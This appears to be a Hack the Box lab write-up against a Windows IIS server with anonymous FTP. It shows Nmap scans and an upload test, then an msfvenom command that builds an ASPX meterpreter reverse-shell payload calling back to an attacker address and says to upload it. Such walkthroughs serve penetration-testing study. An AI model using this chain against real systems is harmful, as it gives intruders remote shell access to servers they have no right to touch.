# Nmap
```CSS
▶ nmap -Pn -sS -p- -T4 --min-rate 5000 10.10.10.5 -oN surface.scan

Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 15:28 IST
Nmap scan report for 10.10.10.5
Host is up (0.26s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 26.62 seconds
```
```CSS
▶ nmap -sC -sV -p 21,80 --min-rate 5000 10.10.10.5 -oN deep.scan

Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 15:31 IST
Nmap scan report for 10.10.10.5
Host is up (0.26s latency).
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.37 seconds
```

# FTP
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/d7c41409-5936-4da5-8464-17f3d93385d2)

# HTTP
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/1b24c617-3c50-4c19-a2c6-4993b136cba5)

# Foothold
- Observe that the FTP server is in the same route as the HTTP server. Which means there stands a chance if file uploads are allowed a file is uploaded via FTP and it can be then accessed directly using the browser.
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a94a4267-2326-4851-9cae-7da69ae1da6e)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/43ce2b5e-170d-40e1-96b9-26541fa165ee)

- Create a text file with any random name and upload it. Then access the uploaded file in the browser.
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/db8bd9ae-4356-43c7-ad3d-2501ebb011a1)
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/3c67d341-5538-410c-aa80-6caa588743c0)

## MSFVenom
  - Generate a payload using `MSFVenom` for a reverse tcp connection to get a shell.
```CSS
▶ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.54 LPORT=4444 -f aspx -o rsp.aspx
```
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/5e2d416c-4b86-4d87-9f23-d93e4c483f56)

 - Upload payload.
![image](https://github.com/karanshergill/Hack-the-Box/assets/83878909/6b8466f5-48f7-4b75-a897-3dd71973f57d)
